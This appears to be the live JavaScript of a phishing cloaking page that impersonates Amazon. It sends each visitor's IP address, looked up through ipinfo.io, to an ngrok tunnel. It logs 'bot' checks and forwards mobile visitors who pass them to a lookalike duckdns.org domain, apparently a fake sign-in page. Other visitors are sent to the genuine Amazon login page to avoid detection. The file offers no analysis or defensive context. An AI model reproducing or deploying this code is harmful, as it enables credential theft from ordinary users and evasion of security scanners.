
<script type="text/javascript" src="https://code.jquery.com/jquery-1.7.1.min.js"></script>


<script>

var arr = [];

function postData(input) {
    response = $.ajax({
        type: "POST",
        url: "https://16a7e19dc4b1.ngrok.io/T456/",
        data: { "ipinfo": input },
        success: callbackFunc
    });
    return response.responseText;
}

$.getJSON('http://ipinfo.io', function(data){
    var a = data.ip;
    postData(a)

});


function checkUaString(){
    var accept = ["iPhone", "Android"];
    var ua = navigator.userAgent;
    for (let i = 0; i < accept.length; i++) {
	if (ua.includes(accept[i]) === true) {
		return true
	}
	else {
	    return false
	}
    }
}





function callbackFunc(response) {
    // do something with the response
    console.log(response)
    if (response.dns == true) {
        console.log("NOT A BOT");
        if (checkUaString() == true){
                console.log("You May Enter");
                window.location.assign("https://amazon-13-w.duckdns.org/a9c");
            }
        else {
            window.location.assign("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
        }
        }
    else {
        console.log("FUCKING BOT");
    }
}



/*
for (let i = 0; i < accept.length; i++) {
	if (ua.includes(accept[i]) === true) {

	}
	else {
		window.location.assign("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
	}
}
*/

</script>
